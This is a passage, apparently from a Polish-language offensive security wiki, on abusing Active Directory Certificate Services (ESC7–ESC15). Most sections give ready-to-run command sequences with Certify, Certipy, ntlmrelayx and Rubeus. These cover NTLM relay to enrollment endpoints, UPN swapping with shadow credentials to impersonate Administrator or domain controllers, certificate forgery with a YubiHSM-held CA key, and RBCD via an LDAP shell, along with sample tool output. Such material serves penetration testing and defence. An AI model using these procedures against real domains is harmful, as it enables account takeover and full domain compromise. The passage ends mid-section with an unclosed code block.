* Wstrzyknąć dodatkowe EKU lub zasady, które nadają certyfikatowi nieoczekiwane zaufanie w systemach zewnętrznych.

Krótko mówiąc, *Manage Certificates* — wcześniej uznawane za „mniej potężną” część ESC7 — można teraz wykorzystać do pełnej eskalacji uprawnień lub długotrwałego utrzymania dostępu, bez zmieniania konfiguracji CA i bez konieczności posiadania bardziej restrykcyjnego uprawnienia *Manage CA*.

#### Nadużycie tej metody za pomocą Certify 2.0

1. **Wyślij żądanie certyfikatu, które pozostanie *oczekujące*.** Można to wymusić, używając szablonu wymagającego zatwierdzenia przez menedżera:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Dołącz niestandardowe rozszerzenie do oczekującego żądania** za pomocą nowego polecenia `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Jeśli szablon nie definiuje już rozszerzenia *Certificate Issuance Policies*, powyższa wartość zostanie zachowana po wystawieniu certyfikatu.*

3. **Wystaw certyfikat** (jeśli Twoja rola ma również uprawnienia zatwierdzania *Manage Certificates*) lub poczekaj, aż operator zatwierdzi żądanie. Po wystawieniu pobierz certyfikat:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Wynikowy certyfikat zawiera teraz złośliwy OID zasad wystawiania i może być użyty w kolejnych atakach (np. ESC13, eskalacji uprawnień w domenie itp.).

> UWAGA: Ten sam atak można przeprowadzić za pomocą Certipy ≥ 4.7, używając polecenia `ca` i parametru `-set-extension`.

## Przekaźnik NTLM do punktów końcowych HTTP AD CS – ESC8

### Wyjaśnienie

> [!TIP]
> W środowiskach, w których **zainstalowano AD CS**, jeśli istnieje **podatny punkt końcowy rejestracji przez sieć Web**, a co najmniej jeden **szablon certyfikatu jest opublikowany** i pozwala **komputerom w domenie na rejestrację oraz uwierzytelnianie klienta** (np. domyślny szablon **`Machine`**), atakujący może przejąć **dowolny komputer z aktywną usługą spooler**!

AD CS obsługuje kilka **metod rejestracji opartych na HTTP**, udostępnianych za pośrednictwem dodatkowych ról serwera, które mogą zainstalować administratorzy. Te interfejsy rejestracji certyfikatów przez HTTP są podatne na **ataki NTLM relay**. Atakujący, działając z **przejętej maszyny, może podszyć się pod dowolne konto AD uwierzytelniające się przez przychodzący ruch NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów sieciowych i **zażądać certyfikatu uwierzytelniania klienta, korzystając z szablonu certyfikatu `User` lub `Machine`**.

- **Interfejs rejestracji przez sieć Web** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`) domyślnie obsługuje wyłącznie HTTP, które nie zapewnia ochrony przed atakami NTLM relay. Ponadto jawnie dopuszcza wyłącznie uwierzytelnianie NTLM w nagłówku HTTP Authorization, co wyklucza bezpieczniejsze metody uwierzytelniania, takie jak Kerberos.
- **Certificate Enrollment Service** (CES), usługa sieci Web **Certificate Enrollment Policy** (CEP) oraz **Network Device Enrollment Service** (NDES) domyślnie obsługują uwierzytelnianie negotiate w nagłówku HTTP Authorization. Uwierzytelnianie negotiate **obsługuje zarówno** Kerberos, jak i **NTLM**, co pozwala atakującemu **obniżyć poziom uwierzytelniania do NTLM** podczas ataków relay. Chociaż te usługi sieci Web domyślnie obsługują HTTPS, samo HTTPS **nie chroni przed atakami NTLM relay**. Ochrona usług HTTPS przed atakami NTLM relay jest możliwa tylko wtedy, gdy HTTPS jest używane razem z channel binding. Niestety AD CS nie włącza w IIS funkcji Extended Protection for Authentication, która jest wymagana do channel binding.<sup>[[6]](#references)</sup>

Częstym **problemem** związanym z atakami NTLM relay jest **krótki czas trwania sesji NTLM** oraz brak możliwości interakcji atakującego z usługami **wymagającymi podpisywania NTLM**.

Można jednak obejść to ograniczenie, wykorzystując atak NTLM relay do uzyskania certyfikatu użytkownika. Czas trwania sesji zależy wtedy od okresu ważności certyfikatu, którego można używać w usługach **wymagających podpisywania NTLM**. Instrukcje dotyczące użycia skradzionego certyfikatu znajdują się w:


{{#ref}}
account-persistence.md
{{#endref}}

Kolejnym ograniczeniem ataków NTLM relay jest to, że **konto ofiary musi uwierzytelnić się na maszynie kontrolowanej przez atakującego**. Atakujący może poczekać lub spróbować **wymusić** takie uwierzytelnienie:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Nadużycie**

Polecenie `cas` w narzędziu [**Certify**](https://github.com/GhostPack/Certify) wylicza **aktywne punkty końcowe HTTP AD CS**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez korporacyjne urzędy certyfikacji (CA) do przechowywania punktów końcowych Certificate Enrollment Service (CES). Punkty końcowe można sparsować i wyświetlić za pomocą narzędzia **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycia z użyciem Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Nadużycie za pomocą [Certipy](https://github.com/ly4k/Certipy)

Certipy domyślnie wysyła żądanie certyfikatu na podstawie szablonu `Machine` lub `User`, zależnie od tego, czy nazwa przekazywanego konta kończy się znakiem `$`. Inny szablon można wskazać za pomocą parametru `-template`.

Następnie można użyć techniki takiej jak [PetitPotam](https://github.com/ly4k/PetitPotam), aby wymusić uwierzytelnienie. W przypadku kontrolerów domeny wymagane jest wskazanie `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, pomija rozszerzenie SID `szOID_NTDS_CA_SECURITY_EXT` w certyfikacie. Starsze przykłady ESC9 zależą od zgodności KDC (`StrongCertificateBindingEnforcement=1`) lub odrębnej ścieżki mapowania Schannel opartej na słabym mapowaniu. Wartość `1` to **historyczne ustawienie zgodności**, a nie obecna wartość domyślna: Microsoft informuje, że nadpisywanie ustawień KDC przestało być obsługiwane wraz z aktualizacją zabezpieczeń systemu Windows z 9 września 2025 r. Przed zastosowaniem starszej instrukcji sprawdź rzeczywistą aktualizację systemu docelowego oraz używany punkt końcowy uwierzytelniania.<sup>[[7]](#references)</sup> Zobacz [wskazówki Microsoft dotyczące wdrażania](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Warunki, w których ustawienie tej flagi nabiera znaczenia:

- Na starszym, zgodnym KDC obowiązująca polityka wiązania certyfikatu zezwala na mapowanie; alternatywnie punkt końcowy Schannel osobno włącza mapowanie UPN za pomocą bitu `0x4` w `CertificateMappingMethods`.
- Certyfikat ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w wartości `msPKI-Enrollment-Flag`.
- Certyfikat określa dowolny EKU uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, aby przejąć inne konto.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local` i chce przejąć konto `Administrator@corp.local`. Szablon certyfikatu `ESC9`, z którego `Jane@corp.local` może korzystać, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w wartości `msPKI-Enrollment-Flag`.

Najpierw uzyskuje się hash `Jane` przy użyciu Shadow Credentials, dzięki uprawnieniom `GenericWrite` użytkownika `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Następnie atrybut `userPrincipalName` użytkownika `Jane` zostaje zmieniony na `Administrator`, celowo pomijając część domenową `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębną wartością `userPrincipalName` użytkownika `Administrator`.

Następnie składany jest wniosek o certyfikat z oznaczonego jako podatny szablonu `ESC9` w imieniu `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Zauważono, że `userPrincipalName` certyfikatu wskazuje na `Administrator`, bez żadnego „object SID”.

Następnie `userPrincipalName` użytkownika `Jane` zostaje przywrócone do pierwotnej wartości: `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Próba uwierzytelnienia przy użyciu wystawionego certyfikatu zwraca teraz hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` ze względu na brak informacji o domenie w certyfikacie:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

W ramach ESC10 często omawia się dwie odrębne zasady mapowania certyfikatów. Odczytaj ustawienie na punkcie końcowym, który faktycznie obsługuje dane uwierzytelnianie:

- Schannel `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` kontroluje mapowanie certyfikatów klienta TLS na serwerze aplikacji. Bit UPN to `0x4`; na zaktualizowanych systemach wartością domyślną jest `0x18` (`0x8 | 0x10`).
- KDC `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` historycznie kontrolował zgodność powiązań certyfikatów Kerberos. Wartość `1` nie jest wiarygodną bieżącą wartością domyślną, a Microsoft zakończył obsługę tego ustawienia za pomocą aktualizacji zabezpieczeń systemu Windows z 9 września 2025 r. Jego stan sam w sobie nie opisuje mapowania UPN w Schannel.<sup>[[7]](#references)</sup>

**Przypadek 1**

Historycznie, gdy starszy KDC respektował `StrongCertificateBindingEnforcement=0`; sprawdź poziom aktualizacji, ponieważ to ustawienie nie jest już obsługiwane w aktualnie załatanych systemach.

**Przypadek 2**

Gdy na punkcie końcowym Schannel obsługującym certyfikaty klienta jest włączony bit UPN (`0x4`) w `CertificateMappingMethods`. To ustawienie jest niezależne od wymuszania silnego powiązania przez KDC i nadal wymaga możliwego do zarejestrowania certyfikatu uwierzytelniania klienta oraz skutecznej kontroli nad atrybutem mapowanego konta.

### Przypadek nadużycia 1

We wdrożeniu, w którym KDC nadal respektuje `StrongCertificateBindingEnforcement=0`, kontrola nad `userPrincipalName` konta może być częścią ścieżki wykorzystującej słabe mapowanie do uzyskania dostępu do innego konta. Wymagane rejestrowanie certyfikatu, mapowanie, tożsamość celu i pomyślne uwierzytelnienie należy sprawdzić osobno; sama lista ACL `GenericWrite` lub wartość rejestru nie potwierdza przejęcia konta.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący dąży do przejęcia konta `Administrator@corp.local`. Procedura jest analogiczna do ESC9 i umożliwia wykorzystanie dowolnego szablonu certyfikatu.

Najpierw hash `Jane` zostaje pobrany za pomocą Shadow Credentials, wykorzystując `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Następnie `userPrincipalName` należący do `Jane` zostaje zmieniony na `Administrator`, celowo z pominięciem części `@corp.local`, aby uniknąć naruszenia ograniczenia.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Następnie jako `Jane` wysyłany jest wniosek o certyfikat umożliwiający uwierzytelnianie klienta, z użyciem domyślnego szablonu `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Wartość `userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócona do pierwotnej wartości `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Uwierzytelnienie za pomocą uzyskanego certyfikatu zwróci hash NT użytkownika `Administrator@corp.local`, co wymaga podania domeny w poleceniu, ponieważ certyfikat nie zawiera informacji o domenie.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Przypadek nadużycia 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszyn i wbudowane konto administratora domeny `Administrator`.

Celem jest przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` za pomocą Shadow Credentials, wykorzystując uprawnienia `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` użytkownika `Jane` zostaje następnie ustawione na `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Żądanie certyfikatu uwierzytelniania klienta jako `Jane` przy użyciu domyślnego szablonu `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości po tym procesie.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Do uwierzytelniania przez Schannel używana jest opcja Certipy `-ldap-shell`, co wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Za pośrednictwem powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają przeprowadzanie ataków Resource-Based Constrained Delegation (RBCD), które mogą doprowadzić do przejęcia kontrolera domeny.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ta podatność dotyczy również każdego konta użytkownika, które nie ma atrybutu `userPrincipalName` lub którego wartość nie jest zgodna z `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest szczególnie atrakcyjnym celem ze względu na podwyższone uprawnienia LDAP i domyślny brak atrybutu `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli na CA Server nie skonfigurowano `IF_ENFORCEENCRYPTICERTREQUEST`, możliwe są ataki NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Odnośnik](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Możesz użyć `certipy`, aby sprawdzić, czy opcja `Enforce Encryption for Requests` jest wyłączona. certipy pokaże wtedy podatności `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenariusz nadużycia

Należy skonfigurować serwer relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Uwaga: W przypadku kontrolerów domeny musimy podać `-template` w DomainController.

Lub używając [forka impacket autorstwa sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Dostęp do powłoki na CA ADCS z YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować urząd certyfikacji tak, aby przechowywał klucz na urządzeniu zewnętrznym, takim jak „Yubico YubiHSM2”.

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB lub przez serwer urządzeń USB, gdy serwer CA jest maszyną wirtualną, do generowania kluczy w YubiHSM i korzystania z nich przez Key Storage Provider wymagany jest klucz uwierzytelniający (czasami nazywany „hasłem”).

Ten klucz/hasło jest przechowywany w rejestrze w postaci jawnego tekstu pod adresem `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Odniesienie znajduje się [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenariusz nadużycia

Jeśli klucz prywatny CA jest przechowywany na fizycznym urządzeniu USB, po uzyskaniu dostępu do powłoki można go odzyskać.

Najpierw należy uzyskać certyfikat CA (jest publiczny), a następnie:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finally, użyj polecenia certutil `-sign`, aby sfałszować nowy, dowolny certyfikat przy użyciu certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` pozwala dodać politykę wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid` odpowiedzialne za wydawanie polityk można znaleźć w Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services), w kontenerze PKI OID. Politykę można powiązać z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, dzięki czemu system może autoryzować użytkownika przedstawiającego certyfikat tak, jakby należał do tej grupy. [Odnośnik](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Innymi słowy, jeśli użytkownik ma uprawnienia do zarejestrowania certyfikatu, a certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenariusz nadużycia

Znajdź użytkownika z odpowiednimi uprawnieniami za pomocą `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienia do rejestrowania się w `VulnerableTemplate`, może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy, że wskaże szablon — otrzyma certyfikat z uprawnieniami `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Nadużycie jawnego mapowania certyfikatów — ESC14

### Wyjaśnienie

Opis na stronie https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest wyjątkowo szczegółowy. Poniżej przytoczono oryginalny tekst.<sup>[[14]](#references)</sup>

ESC14 dotyczy luk wynikających ze „słabego jawnego mapowania certyfikatów”, przede wszystkim z niewłaściwego użycia lub niebezpiecznej konfiguracji atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten atrybut wielowartościowy pozwala administratorom ręcznie powiązać certyfikaty X.509 z kontem AD na potrzeby uwierzytelniania. Po skonfigurowaniu takie jawne mapowania mogą zastąpić domyślną logikę mapowania certyfikatów, która zazwyczaj opiera się na UPN-ach lub nazwach DNS w SAN certyfikatu albo na identyfikatorze SID osadzonym w rozszerzeniu zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`.

Mapowanie jest „słabe”, gdy wartość tekstowa użyta w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt ogólna, łatwa do odgadnięcia, opiera się na nieunikatowych polach certyfikatu lub wykorzystuje łatwe do podszycia się komponenty certyfikatu. Jeśli atakujący może uzyskać lub utworzyć certyfikat, którego atrybuty odpowiadają tak zdefiniowanemu słabemu jawnemu mapowaniu dla uprzywilejowanego konta, może użyć tego certyfikatu, aby uwierzytelnić się jako to konto i podszyć się pod nie.

Przykłady potencjalnie słabych ciągów mapowania `altSecurityIdentities`:

- Mapowanie wyłącznie na podstawie typowej nazwy Common Name (CN) podmiotu, np. `X509:<S>CN=SomeUser`. Atakujący może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Użycie zbyt ogólnych nazw wyróżniających (DN) wystawcy lub podmiotu bez dodatkowego kryterium, takiego jak konkretny numer seryjny lub identyfikator klucza podmiotu, np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Użycie innych przewidywalnych wzorców lub identyfikatorów nieopartych na kryptografii, którym atakujący może sprostać w certyfikacie, który może legalnie uzyskać lub sfałszować (jeśli przejął urząd certyfikacji lub znalazł podatny szablon, jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie na podstawie pełnych DN wystawcy i podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie na podstawie wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie na podstawie numeru seryjnego, pośrednio kwalifikowanego przez DN wystawcy) — nie jest to format standardowy; zwykle używa się `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie na podstawie nazwy RFC822, zazwyczaj adresu e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie na podstawie skrótu SHA1 surowego klucza publicznego certyfikatu — zasadniczo silne)

Bezpieczeństwo tych mapowań zależy od użytych identyfikatorów. Microsoft klasyfikuje mapowania oparte na adresach e-mail lub nazwach podmiotu, w tym `X509:<RFC822>`, jako **słabe**. W trybie Full Enforcement certyfikat bez silnego mapowania jest odrzucany; aktualizacja zabezpieczeń systemu Windows z września 2025 r. usunęła możliwość powrotu do trybu Compatibility. Samo słabe mapowanie nie jest więc obecnie niezawodną metodą podszycia się pod inne konto. Przed oceną scenariusza opartego na słabym mapowaniu sprawdź poziom aktualizacji kontrolera domeny i jego faktyczne zachowanie przy mapowaniu certyfikatów. Uprawnienie do zapisu w `altSecurityIdentities` to osobna wskazówka: atakujący dysponujący odpowiednim zaufanym certyfikatem może być w stanie dodać **silne** jawne mapowanie, zależnie od efektywnych uprawnień i walidacji certyfikatu. Zobacz [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) oraz [badania nad ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Należy również zdiagnozować błędy uwierzytelniania certyfikatem: wyłączone konto docelowe lub wygasłe hasło mogą uniemożliwić logowanie, nawet jeśli sam certyfikat pozostaje ważny.

### Scenariusz nadużycia

ESC14 dotyczy **jawnych mapowań certyfikatów** w Active Directory (AD), a konkretnie atrybutu `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (celowo lub w wyniku błędnej konfiguracji), atakujący mogą podszywać się pod konta, przedstawiając certyfikaty zgodne z mapowaniem.

#### Scenariusz A: Atakujący może zapisywać do `altSecurityIdentities`

 **Warunek wstępny**: Atakujący ma uprawnienia do zapisu w atrybucie `altSecurityIdentities` konta docelowego albo uprawnienie do nadania sobie takich uprawnień w postaci jednego z poniższych uprawnień do obiektu AD celu:  
- Zapis właściwości `altSecurityIdentities`  
- Zapis właściwości `Public-Information`  
- Zapis właściwości (wszystkich)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Właściciel*.
#### Scenariusz B: Cel ma słabe mapowanie X509RFC822 (adres e-mail)

- **Historyczny/warunkowy warunek wstępny**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`, atakujący może edytować atrybut `mail` podmiotu rejestrującego certyfikat, a odpowiedni szablon uwzględnia ten adres e-mail w certyfikacie do uwierzytelniania klienta, bez konfliktującego powiązania SID. Uwierzytelnianie wymaga również środowiska, które nadal akceptuje słabe mapowanie; tryb Full Enforcement odrzuca certyfikaty z samym słabym mapowaniem. Sam zapis do atrybutu `mail` jest tylko wskazówką.
#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` podmiotu będącego celem, tak aby odpowiadał on podmiotowi z mapowania X509IssuerSubject celu. Następnie atakujący może zarejestrować certyfikat jako ten podmiot i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` podmiotu będącego celem, tak aby odpowiadał on podmiotowi z mapowania X509SubjectOnly celu. Następnie atakujący może zarejestrować certyfikat jako ten podmiot i użyć go do uwierzytelnienia się jako cel.
### Konkretne operacje
#### Scenariusz A

Zażądaj certyfikatu z szablonu certyfikatu `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Zapisz i przekonwertuj certyfikat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Uwierzytelnij się (za pomocą certyfikatu)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Sprzątanie (opcjonalnie)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

W przypadku bardziej szczegółowych metod ataku w różnych scenariuszach ataku zapoznaj się z: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

[Oryginalne badania nad ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) wyjaśniają, w jaki sposób application policies podane w żądaniu dotyczącym szablonu V1 mogą nadpisać skonfigurowane Extended Key Usage na **niezałatanej CA wystawiającej certyfikaty**.<sup>[[15]](#references)</sup> Kandydat musi również mieć opublikowany szablon, który dopuszcza enrollment oraz wymagane właściwości podmiotu/żądania, a także nie wymaga blokującego zatwierdzenia ani podpisu. Same uprawnienia do enrollment nie potwierdzają możliwości wykorzystania podatności. Użycie Certificate Request Agent może dodatkowo zależeć od odpowiedniego drugiego szablonu oraz ograniczeń agenta enrollment; przed potwierdzeniem tej ścieżki sprawdź stan poprawek CA i wynik wystawienia certyfikatu.

### Wykorzystanie

[Dokumentacja Certipy dotycząca eskalacji uprawnień](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) zawiera bardziej szczegółowe przykłady użycia.<sup>[[14]](#references)</sup>


Polecenie `find` w Certipy może pomóc zidentyfikować szablony V1 potencjalnie podatne na ESC15, jeśli CA nie ma zainstalowanych poprawek.

```bash
